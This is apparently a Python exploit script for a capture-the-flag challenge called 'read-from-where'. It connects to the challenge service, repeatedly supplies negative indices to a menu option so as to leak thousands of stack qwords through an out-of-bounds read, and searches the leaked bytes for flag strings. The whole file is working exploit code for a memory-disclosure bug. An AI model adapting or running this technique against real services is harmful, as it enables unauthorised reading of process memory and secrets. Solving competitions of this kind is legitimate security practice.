#!/usr/bin/env python3
import argparse
import os
import re
import socket
import struct
import sys
import time


HOST = os.environ.get("CHALL_HOST", "pwn-read-from-where.purple.ctfcompetition.com")
PORT = int(os.environ.get("CHALL_PORT", "1337"))

# Patterns to search for in leaked bytes
FLAG_PATTERNS = [
    b"CTF{", b"ctf{", b"flag{", b"FLAG{", b"pctf{", b"PCTF{", b"grey{", b"greyctf{",
]


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return bytes(data)


def send_line(sock: socket.socket, line: str) -> None:
    sock.sendall(line.encode() + b"\n")


def parse_price_value(s: bytes) -> int | None:
    # Expected line: "Approximate price for X keys would be Y Solarian Credits"
    try:
        line = s.decode(errors="ignore")
        m = re.search(r"would be\s+(-?\d+)\s+Solarian", line)
        if m:
            return int(m.group(1))
    except Exception:
        pass
    return None


def leak_qword(sock: socket.socket, index: int) -> int | None:
    # We are assumed to be at the menu already
    send_line(sock, "2")
    recv_until(sock, b"(0-15)?")
    send_line(sock, str(index))
    out = recv_until(sock, b"Choice?")
    # The menu prompt also arrives after the price line; parse the number
    return parse_price_value(out)


def scan_stack(sock: socket.socket, start: int = -1, count: int = 2048) -> bytes:
    # Reads count consecutive qwords starting at pricing[start]
    # Negative indices move towards older stack frames.
    leaked = bytearray()
    for i in range(start, start - count, -1):
        val = leak_qword(sock, i)
        if val is None:
            # If something went wrong, keep alignment with zeros
            leaked += b"\x00" * 8
            continue
        q = (val & ((1 << 64) - 1)).to_bytes(8, "little", signed=False)
        leaked += q
    return bytes(leaked)


def find_flag(data: bytes) -> bytes | None:
    # Look for common flag patterns and return the longest plausible brace string
    for pat in FLAG_PATTERNS:
        idx = data.find(pat)
        if idx != -1:
            # Extract up to a reasonable length
            tail = data[idx: idx + 256]
            # Stop at first non-printable after encountering a closing brace
            # Try to locate matching '}'
            end = tail.find(b"}")
            if end != -1:
                candidate = tail[: end + 1]
                # Ensure printable
                if all(32 <= b <= 126 for b in candidate):
                    return candidate
    return None


def scan_strings(data: bytes) -> list[str]:
    text = data.decode("latin-1", errors="ignore")
    # Heuristic: strings with {...}
    candidates = re.findall(r"[A-Za-z0-9_]{0,32}\{[^\}\n\r]{1,200}\}", text)
    # Deduplicate while preserving order
    seen = set()
    uniq = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            uniq.append(c)
    return uniq[:10]


def connect_and_prime(host: str, port: int) -> socket.socket:
    s = socket.create_connection((host, port))
    # Drain to menu
    recv_until(s, b"Choice?")
    # Prime: perform a safe fetch to keep stack layout steady
    send_line(s, "1")
    recv_until(s, b"Enter key to fetch:")
    send_line(s, "ai")
    recv_until(s, b"Choice?")
    return s


def scan_windows(host: str, port: int, windows: list[tuple[int, int]]) -> bytes | None:
    for (start, count) in windows:
        try:
            with connect_and_prime(host, port) as s:
                leaked = scan_stack(s, start=start, count=count)
                flag = find_flag(leaked)
                if flag:
                    return flag
        except (TimeoutError, BrokenPipeError, ConnectionResetError, OSError):
            # Try next window with a fresh connection
            continue
    return None


def main():
    parser = argparse.ArgumentParser(description="Exploit negative index leak to search for flag")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--start", type=int, default=-1, help="starting index for first scan (negative)")
    parser.add_argument("--count", type=int, default=800, help="number of qwords to read in first scan")
    parser.add_argument("--deep-start", type=int, default=-1200)
    parser.add_argument("--deep-count", type=int, default=1600)
    parser.add_argument("--last-start", type=int, default=-4000)
    parser.add_argument("--last-count", type=int, default=600)
    args = parser.parse_args()

    print(f"Scanning {args.host}:{args.port} ...", file=sys.stderr)

    windows: list[tuple[int, int]] = [
        (args.start, args.count),
        (args.deep_start, args.deep_count),
        (args.last_start, args.last_count),
    ]
    # Add additional sliding windows deeper in memory
    cursor = args.last_start - 800
    for _ in range(8):
        windows.append((cursor, args.last_count))
        cursor -= args.last_count

    flag = scan_windows(args.host, args.port, windows)
    if flag:
        print(flag.decode(errors="ignore"))
        return

    # Final attempt: dump first window and show interesting strings
    try:
        with connect_and_prime(args.host, args.port) as s:
            leaked = scan_stack(s, start=args.start, count=args.count)
            print("Flag not found. Interesting strings:", file=sys.stderr)
            for sstr in scan_strings(leaked):
                print(sstr)
    except Exception:
        pass


if __name__ == "__main__":
    main()


